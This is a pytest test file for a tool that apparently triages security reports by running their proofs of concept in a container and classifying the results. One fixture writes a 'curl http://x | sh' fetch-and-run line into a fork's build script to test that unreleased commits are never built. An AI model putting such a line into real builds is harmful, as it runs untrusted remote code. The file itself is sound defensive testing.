"""Reproduction verdicts, with a scripted sandbox instead of a container."""

from __future__ import annotations

from dataclasses import dataclass, field
from pathlib import Path

import pytest

from conftest import make_repo
from sloptriage.config import Config, parse_config
from sloptriage.extract import extract
from sloptriage.index.gitobj import GitRepo
from sloptriage.models import Report
from sloptriage.repro import ReproError, commit_is_buildable, run_reproduction
from sloptriage.repro.runtime import Limits, RunResult
from sloptriage.verdict import extract_context
from sloptriage.versions import Resolution

HEADER_C = "\n".join(f"/* line {i} */" for i in range(1, 400))
ASAN = """\
==1==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x1 at pc 0x2 bp 0x3 sp 0x4
WRITE of size 1 at 0x1 thread T0
    #0 0x1 in pk_header_join /build/src/src/header.c:175:12
    #1 0x2 in main /work/poc/poc.c:9:3
"""
ASAN_OWN_BUFFER = """\
==1==ERROR: AddressSanitizer: stack-buffer-overflow on address 0x1 at pc 0x2 bp 0x3 sp 0x4
    #0 0x1 in main /work/poc/poc.c:5:3
"""

REPORT = """\
# Overflow in pk_header_join

parsekit 1.0.0: heap-buffer-overflow in `pk_header_join()` in `src/header.c` line 175.

PoC:

```c
#include <parsekit.h>
int main(void) { return pk_header_join(0, "x") != 0; }
```
"""


@dataclass
class Scripted:
    """A sandbox whose runs follow a script: one RunResult per call, then the last one repeats."""

    results: list[RunResult]
    image_error: str | None = None
    runs: list[str] = field(default_factory=list)
    images: int = 0

    def ensure_image(self, commit: str, label: str) -> tuple[str | None, str | None]:
        self.images += 1
        if self.image_error:
            return None, self.image_error
        return "sloptriage/test:img", None

    def run(self, image: str, plan: object, limits: Limits) -> RunResult:
        self.runs.append(getattr(plan, "script", ""))
        i = min(len(self.runs) - 1, len(self.results) - 1)
        marker = getattr(plan, "marker", "")
        r = self.results[i]
        started = f"sloptriage-started:{marker}\n"
        return RunResult(
            stdout=r.stdout,
            stderr=started + r.stderr.replace("{MARKER}", marker),
            exit_code=r.exit_code,
            seconds=r.seconds,
            timed_out=r.timed_out,
            oom=r.oom,
            truncated=r.truncated,
            flooded=r.flooded,
        )


def res(stderr: str = "", exit_code: int = 0, **kw: object) -> RunResult:
    return RunResult(stdout="", stderr=stderr, exit_code=exit_code, seconds=0.1, **kw)  # type: ignore[arg-type]


@pytest.fixture
def project(tmp_path: Path) -> tuple[GitRepo, Resolution, Config]:
    repo_path = make_repo(
        tmp_path / "proj",
        [
            ("v1.0.0", {"src/header.c": HEADER_C, "cli/parsekit.c": "int main(void){}\n"}),
        ],
    )
    repo = GitRepo(repo_path)
    commit = repo.run("rev-parse", "HEAD").strip()
    resolution = Resolution(commit, "v1.0.0", False, "claimed")
    cfg = parse_config(
        {
            "version": 1,
            "project": {"name": "parsekit", "binaries": ["parsekit"]},
            "version_tags": ["v"],
            "languages": ["c"],
            "repro": {"enabled": True, "build": {"preset": "cmake-asan"}},
        },
        "p.yml",
    )
    return repo, resolution, cfg


def run(
    project: tuple[GitRepo, Resolution, Config],
    sandbox: Scripted,
    text: str = REPORT,
    attachments: list | None = None,
) -> dict:  # type: ignore[type-arg]
    repo, resolution, cfg = project
    report = Report("file", "r", "t", text, attachments or [])
    extraction = extract(report.text, extract_context(cfg))
    return run_reproduction(report, extraction, resolution, repo, cfg, sandbox)


def test_matching_crash_in_three_runs_is_reproduced(project) -> None:  # noqa: ANN001
    sb = Scripted([res(ASAN, 1)])
    out = run(project, sb)
    assert out["verdict"] == "reproduced"
    assert out["runner"] == "c"
    assert len(sb.runs) == 3
    assert all(r["error_type"] == "heap-buffer-overflow" for r in out["runs"])
    assert out["runs"][0]["top_frame"] == "pk_header_join"
    assert out["runs"][0]["top_path"] == "src/header.c"
    assert "AddressSanitizer" in out["output_excerpt"]


def test_crash_inside_the_poc_itself_is_not_a_reproduction(project) -> None:  # noqa: ANN001
    out = run(project, Scripted([res(ASAN_OWN_BUFFER, 1)]))
    assert out["verdict"] == "crashed_elsewhere"


def test_crash_in_a_function_the_report_does_not_name(project) -> None:  # noqa: ANN001
    other = ASAN.replace("pk_header_join", "pk_other").replace("src/header.c", "cli/parsekit.c")
    out = run(project, Scripted([res(other, 1)]))
    assert out["verdict"] == "crashed_elsewhere"


def test_same_error_type_in_the_same_file_counts_as_matching(project) -> None:  # noqa: ANN001
    renamed = ASAN.replace("pk_header_join", "pk_helper")
    out = run(project, Scripted([res(renamed, 1)]))
    assert out["verdict"] == "reproduced"


def test_a_report_that_names_no_function_or_file_is_matched_by_error_type(project) -> None:  # noqa: ANN001
    text = (
        "parsekit 1.0.0 crashes with a heap-buffer-overflow on two Accept headers.\n\n"
        "PoC:\n\n```sh\nparsekit header \"$(printf 'Accept: a\\r\\nAccept: b\\r\\n')\"\n```\n"
    )
    out = run(project, Scripted([res(ASAN, 1)]), text=text)
    assert out["verdict"] == "reproduced"
    other = ASAN.replace("heap-buffer-overflow", "heap-use-after-free")
    assert run(project, Scripted([res(other, 1)]), text=text)["verdict"] == "crashed_elsewhere"


def test_three_clean_runs_are_not_reproduced(project) -> None:  # noqa: ANN001
    sb = Scripted([res("ok\n", 0)])
    out = run(project, sb)
    assert out["verdict"] == "not_reproduced"
    assert len(sb.runs) == 3


def test_report_text_printed_by_a_clean_exit_is_not_a_crash(project) -> None:  # noqa: ANN001
    out = run(project, Scripted([res(ASAN, 0)]))
    assert out["verdict"] == "not_reproduced"


def test_mixed_outcomes_are_reported_as_flaky(project) -> None:  # noqa: ANN001
    out = run(project, Scripted([res(ASAN, 1), res("", 0), res(ASAN, 1)]))
    assert out["verdict"] == "flaky"
    assert [r["outcome"] for r in out["runs"]] == ["crash", "clean", "crash"]


def test_a_timeout_is_recorded_and_not_repeated(project) -> None:  # noqa: ANN001
    sb = Scripted([res("", 137, timed_out=True)])
    out = run(project, sb)
    assert out["verdict"] == "timeout"
    assert len(sb.runs) == 1


def test_compile_failure_stops_after_one_run(project) -> None:  # noqa: ANN001
    sb = Scripted(
        [
            res(
                "sloptriage-compile-failed:{MARKER}\npoc.c:3: error: implicit declaration of 'pk_nope'\n",
                253,
            )
        ]
    )
    out = run(project, sb)
    assert out["verdict"] == "poc_build_failed"
    assert len(sb.runs) == 1
    assert "implicit declaration" in out["output_excerpt"]


def test_build_failure_of_the_project_is_an_infrastructure_verdict(project) -> None:  # noqa: ANN001
    sb = Scripted([res()], image_error="cmake: command not found")
    out = run(project, sb)
    assert out["verdict"] == "build_failed"
    assert sb.runs == []
    assert "cmake" in out["reason"]


def test_a_report_without_a_poc_never_touches_the_sandbox(project) -> None:  # noqa: ANN001
    sb = Scripted([res()])
    out = run(project, sb, text="`pk_header_join()` in `src/header.c` crashes.")
    assert out["verdict"] == "poc_missing"
    assert sb.images == 0 and sb.runs == []


def test_unsupported_language_is_reported_without_building(project) -> None:  # noqa: ANN001
    sb = Scripted([res()])
    text = "Steps to reproduce with this PoC:\n\n```go\npackage main\nfunc main() { run() }\n```\n"
    out = run(project, sb, text=text)
    assert out["verdict"] == "poc_unsupported"
    assert "go" in out["reason"].lower()
    assert sb.images == 0


def test_network_dependent_poc_is_unsupported_not_clean(project) -> None:  # noqa: ANN001
    sb = Scripted([res("curl: (6) Could not resolve host: victim.example\n", 6)])
    text = "PoC:\n\n```sh\nparsekit url http://victim.example/\n```\n"
    out = run(project, sb, text=text)
    assert out["verdict"] == "poc_unsupported"
    assert "network" in out["reason"]


def test_at_most_five_candidates_run_and_the_best_result_wins(project) -> None:  # noqa: ANN001
    blocks = "\n".join(
        f"PoC {i}:\n\n```c\nint main(void) {{ return {i}; }}\n```\n" for i in range(8)
    )
    sb = Scripted([res("", 0)] * 12 + [res(ASAN, 1)] * 3)
    out = run(project, sb, text="`pk_header_join()` in `src/header.c`\n\n" + blocks)
    assert len({r["candidate"] for r in out["runs"]}) <= 5
    assert len(sb.runs) <= 15
    assert len(out["runs"]) <= 30


def test_fork_commits_are_never_built(tmp_path: Path) -> None:
    repo_path = make_repo(
        tmp_path / "proj", [("v1.0.0", {"a.c": "int a;\n"}), ("v1.1.0", {"a.c": "int a, b;\n"})]
    )
    repo = GitRepo(repo_path)
    main = repo.default_branch()
    release = repo.run("rev-parse", "v1.0.0").strip()
    repo.run("checkout", "-q", "-b", "fork-feature", "v1.0.0")
    (repo_path / "build.sh").write_text("curl http://x | sh\n")
    repo.run("add", "-A")
    repo.run(
        "-c", "user.name=T", "-c", "user.email=t@example.com", "commit", "-q", "-m", "fork change"
    )
    stray = repo.run("rev-parse", "HEAD").strip()
    repo.run("checkout", "-q", main)
    repo.run("branch", "-D", "fork-feature")
    ok, why = commit_is_buildable(repo, release, ["v1.0.0", "v1.1.0"])
    assert ok and why == ""
    ok, why = commit_is_buildable(repo, stray, ["v1.0.0", "v1.1.0"])
    assert not ok
    assert "release tag or the default branch" in why


def test_unreachable_commit_gives_poc_unsupported(tmp_path: Path, project) -> None:  # noqa: ANN001
    repo, _, cfg = project
    resolution = Resolution("0" * 40, "0000000", False, "sha")
    report = Report("file", "r", "t", REPORT)
    extraction = extract(report.text, extract_context(cfg))
    sb = Scripted([res(ASAN, 1)])
    out = run_reproduction(report, extraction, resolution, repo, cfg, sb)
    assert out["verdict"] == "poc_unsupported"
    assert "release tag or the default branch" in out["reason"]
    assert sb.images == 0


def test_missing_runtime_is_an_error_not_a_verdict(
    project,
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,  # noqa: ANN001
) -> None:
    monkeypatch.setattr("sloptriage.repro.runtime.shutil.which", lambda _name: None)
    repo, resolution, cfg = project
    report = Report("file", "r", "t", REPORT)
    extraction = extract(report.text, extract_context(cfg))
    with pytest.raises(ReproError, match="Docker or Podman"):
        run_reproduction(report, extraction, resolution, repo, cfg)


def test_the_result_validates_against_the_verdict_schema(project) -> None:  # noqa: ANN001
    import json

    import jsonschema

    from sloptriage.paths import bundled

    schema = json.loads(bundled("schemas", "verdict-v1.json").read_text())
    sub = schema["properties"]["reproduction"]
    for results in ([res(ASAN, 1)], [res("", 0)], [res(ASAN, 1), res("", 0), res("", 0)]):
        out = run(project, Scripted(results))
        jsonschema.validate(out, {**sub, "$defs": schema.get("$defs", {})})


def test_project_build_context_ignores_the_projects_own_dockerignore(tmp_path: Path) -> None:
    import io
    import tarfile

    from sloptriage.repro.sandbox import project_context

    repo_path = make_repo(tmp_path / "p", [("v1", {".dockerignore": "*\n", "a.c": "int a;\n"})])
    repo = GitRepo(repo_path)
    blob = project_context(repo, repo.run("rev-parse", "HEAD").strip(), "FROM x\n")
    with tarfile.open(fileobj=io.BytesIO(blob)) as tf:
        names = set(tf.getnames())
        assert {"a.c", "Dockerfile.sloptriage", "Dockerfile.sloptriage.dockerignore"} <= names
        assert tf.extractfile("Dockerfile.sloptriage.dockerignore").read() == b""  # type: ignore[union-attr]


# -- findings from the independent review ---------------------------------------------------------
def test_a_poc_may_exit_with_the_toolkits_own_codes_without_aborting_the_check(project) -> None:  # noqa: ANN001
    for code in (252, 253, 125, 126, 127):
        out = run(project, Scripted([res("", code)]))
        assert out["verdict"] == "not_reproduced", code
    fake_daemon = res("docker: Error response from daemon: boom\n", 125)
    assert run(project, Scripted([fake_daemon]))["verdict"] == "not_reproduced"


def test_a_container_that_never_started_is_an_error(project) -> None:  # noqa: ANN001
    class Broken(Scripted):
        def run(self, image: str, plan: object, limits: Limits) -> RunResult:
            return res("docker: Error response from daemon: no such image\n", 125)

    with pytest.raises(ReproError, match="could not be started"):
        run(project, Broken([res()]))


def test_a_setup_failure_marker_is_an_error(project) -> None:  # noqa: ANN001
    sb = Scripted([res("sloptriage-setup-failed:{MARKER}\n", 252)])
    with pytest.raises(ReproError, match="unpack"):
        run(project, sb)


def test_a_poc_that_needs_a_tool_the_image_lacks_is_unsupported_not_clean(project) -> None:  # noqa: ANN001
    for text in (
        "./poc.sh: line 2: sudo: command not found\n",
        "./poc.sh: line 9: python3: command not found\n",
        "sh: 1: nc: not found\n",
    ):
        out = run(project, Scripted([res(text, 127)]))
        assert out["verdict"] == "poc_unsupported", text
        assert "not installed" in out["reason"]


@pytest.mark.parametrize(
    ("output", "reason_part"),
    [
        ("curl: Can't open 'payload.bin'\ncurl: (26) Failed to read data\n", "file"),
        ("./poc.sh: line 10: ./build/src/curl: No such file or directory\n", "file"),
        ("curl: (7) Failed to connect to localhost port 4433: Connection refused\n", "service"),
        ("curl: (7) Couldn't connect to server\n", "service"),
        ("./poc.sh: line 1: syntax error near unexpected token `('\n", "runnable"),
        ("[!] missing required command: cmake\n", "not installed"),
    ],
)
def test_a_poc_that_cannot_run_as_given_is_unsupported_with_a_reason(
    project,  # noqa: ANN001
    output: str,
    reason_part: str,
) -> None:
    out = run(project, Scripted([res(output, 1)]))
    assert out["verdict"] == "poc_unsupported", output
    assert reason_part in out["reason"]


def test_a_missing_file_message_does_not_hide_a_crash(project) -> None:  # noqa: ANN001
    text = "cat: x: No such file or directory\n" + ASAN
    assert run(project, Scripted([res(text, 1)]))["verdict"] == "reproduced"


def test_a_crash_wins_over_a_missing_tool_message(project) -> None:  # noqa: ANN001
    text = "./poc.sh: line 2: nc: command not found\n" + ASAN
    assert run(project, Scripted([res(text, 1)]))["verdict"] == "reproduced"


def test_broken_pipes_and_terminations_are_not_crashes(project) -> None:  # noqa: ANN001
    for code in (141, 143):
        assert run(project, Scripted([res("", code)]))["verdict"] == "not_reproduced", code


def test_a_plain_kill_is_not_reported_as_the_memory_limit(project) -> None:  # noqa: ANN001
    out = run(project, Scripted([res("", 137)]))
    assert out["verdict"] == "crashed_elsewhere"
    assert "memory" not in out["reason"]
    oom = run(project, Scripted([res("", 137, oom=True)]))
    assert oom["verdict"] == "crashed_elsewhere" and "memory" in oom["reason"]


def test_a_printed_ubsan_line_with_a_clean_exit_is_text_when_ubsan_stops_the_program(
    project,  # noqa: ANN001
) -> None:
    line = (
        "/build/src/src/header.c:175:12: runtime error: index 9 out of bounds for type 'int [4]'\n"
    )
    assert run(project, Scripted([res(line, 0)]))["verdict"] == "not_reproduced"


def test_ubsan_that_reports_and_carries_on_counts_when_the_recipe_leaves_recovery_on(
    project,  # noqa: ANN001
) -> None:
    repo, resolution, cfg = project
    cfg.repro.build.sanitizer_flags = ["-fsanitize=address,undefined", "-g"]
    line = (
        "/build/src/src/header.c:175:12: runtime error: index 9 out of bounds for type 'int [4]'\n"
    )
    out = run(project, Scripted([res(line, 0)]))
    assert out["verdict"] == "reproduced"


def test_long_names_from_a_poc_cannot_break_the_verdict_schema(project) -> None:  # noqa: ANN001
    import json

    import jsonschema

    from sloptriage.paths import bundled

    schema = json.loads(bundled("schemas", "verdict-v1.json").read_text())
    sub = {**schema["properties"]["reproduction"], "$defs": schema.get("$defs", {})}
    long_type = "x" * 300
    hostile = (
        f"==1==ERROR: AddressSanitizer: {long_type} on address 0x1\n"
        f"    #0 0x1 in {'f' * 300} /build/src/src/header.c:175:12\n"
    )
    out = run(project, Scripted([res(hostile, 1)]))
    jsonschema.validate(out, sub)
    assert all(len(r["error_type"] or "") <= 80 for r in out["runs"])
    assert all(len(r["top_frame"] or "") <= 200 for r in out["runs"])


def test_the_chosen_candidate_and_how_it_matched_are_recorded(project) -> None:  # noqa: ANN001
    blocks = (
        "`pk_header_join()` in `src/header.c`, heap-buffer-overflow.\n\n"
        "PoC 0:\n\n```c\nint main(void) { return 0; }\n```\n\n"
        "PoC 1:\n\n```c\nint main(void) { return 1; }\n```\n"
    )
    segv = (
        "==1==ERROR: AddressSanitizer: SEGV on unknown address 0x0\n"
        "    #0 0x1 in main /work/poc/poc.c:3:3\n"
    )
    sb = Scripted([res(segv, 1)] * 3 + [res(ASAN, 1)] * 3)
    out = run(project, sb, text=blocks)
    assert out["verdict"] == "reproduced"
    assert out["candidate"] == 1
    assert out["match"] == "function_and_type"


def test_a_function_match_with_a_different_error_type_says_so(project) -> None:  # noqa: ANN001
    other = ASAN.replace("heap-buffer-overflow", "heap-use-after-free")
    out = run(project, Scripted([res(other, 1)]))
    assert out["verdict"] == "reproduced"
    assert out["match"] == "function_type_differs"
    assert "differs" in out["reason"]


def test_paths_that_start_with_a_dot_directory_still_match() -> None:
    from sloptriage.extract import Claim
    from sloptriage.repro.outcome import ClaimsView

    view = ClaimsView.of([Claim("path", ".github/x.c", 0, 5, "high", "prose", path=".github/x.c")])
    assert view.names_file(".github/x.c")
    view = ClaimsView.of([Claim("path", "./src/a.c", 0, 5, "high", "prose", path="./src/a.c")])
    assert view.names_file("src/a.c")


def test_two_server_blocks_start_the_first_and_report_the_other() -> None:
    from sloptriage.repro.runners import Candidate, split_roles

    def cand(i: int, role: str) -> Candidate:
        return Candidate(i, "python", "inline", f"p{i}.py", b"x", None, role, i)

    mains, companion, skipped = split_roles([cand(0, "server"), cand(1, "server"), cand(2, "main")])
    assert [c.index for c in mains] == [2]
    assert companion is not None and companion.index == 0
    assert [(c.index, "only the first" in (c.unsupported or "")) for c in skipped] == [(1, True)]
    mains, companion, skipped = split_roles([cand(0, "server")])
    assert [c.index for c in mains] == [0] and companion is None and skipped == []


def test_a_poc_larger_than_the_limit_is_unsupported_not_an_error(
    project,  # noqa: ANN001
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    monkeypatch.setattr("sloptriage.repro.runners.MAX_ARTEFACT", 200)
    huge = "int main(void) { return 0; }\n/* " + "x" * 400 + " */\n"
    out = run(project, Scripted([res()]), text=f"PoC:\n\n```c\n{huge}```\n")
    assert out["verdict"] == "poc_unsupported" and "larger" in out["reason"]


def test_a_sanitizer_that_cannot_start_on_this_host_is_an_environment_problem(project) -> None:  # noqa: ANN001
    msg = (
        "==1==Shadow memory range interleaves with an existing memory mapping. "
        "ASan cannot proceed correctly. ABORTING.\n"
    )
    out = run(project, Scripted([res(msg, 1)]))
    assert out["verdict"] == "build_failed"
    assert "vm.mmap_rnd_bits" in out["reason"]
    assert "not of the report" in out["reason"]


def test_a_python_error_about_a_missing_file_or_module_in_the_poc_is_not_a_crash(project) -> None:  # noqa: ANN001
    for exc, part in (
        ("FileNotFoundError: [Errno 2] No such file or directory: 'curl'", "file"),
        ("ModuleNotFoundError: No module named 'requests'", "not installed"),
    ):
        text = (
            "Traceback (most recent call last):\n"
            '  File "/work/poc/poc.py", line 3, in <module>\n    run()\n' + exc + "\n"
        )
        out = run(project, Scripted([res(text, 1)]))
        assert out["verdict"] == "poc_unsupported", exc
        assert part in out["reason"]


def test_a_python_error_inside_the_project_is_still_a_crash(project) -> None:  # noqa: ANN001
    text = (
        "Traceback (most recent call last):\n"
        '  File "/work/poc/poc.py", line 3, in <module>\n    run()\n'
        '  File "/usr/local/lib/python3.12/site-packages/src/header.c", line 2, in Curl_parse\n    x\n'
        "FileNotFoundError: gone\n"
    )
    assert run(project, Scripted([res(text, 1)]))["verdict"] != "poc_unsupported"


@pytest.mark.parametrize(
    ("output", "reason_part"),
    [
        ("missing executable: /work/poc/build-poc/src/curl\n", "not installed"),
        (
            '* Protocol "sftp" not supported or disabled in libcurl\nrc=1 (Unsupported protocol)\n',
            "feature",
        ),
    ],
)
def test_other_things_that_stop_a_poc_before_the_project_runs(
    project,  # noqa: ANN001
    output: str,
    reason_part: str,
) -> None:
    out = run(project, Scripted([res(output, 1)]))
    assert out["verdict"] == "poc_unsupported" and reason_part in out["reason"]


def test_a_crash_in_an_installed_library_is_attributed_to_the_function_the_report_names(
    project,  # noqa: ANN001
) -> None:
    text = (
        "==1==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x1\n"
        "    #0 0x1 in memcpy (/usr/lib/libc.so.6+0x1)\n"
        "    #1 0x2 in pk_header_join (/opt/project/lib/libparsekit.so.1+0x23c7c) (BuildId: abc)\n"
        "    #2 0x3 in main /work/poc/poc.c:9:3\n"
    )
    out = run(project, Scripted([res(text, 1)]))
    assert out["verdict"] == "reproduced"
    assert out["runs"][0]["top_frame"] == "pk_header_join" and out["runs"][0]["top_path"] is None
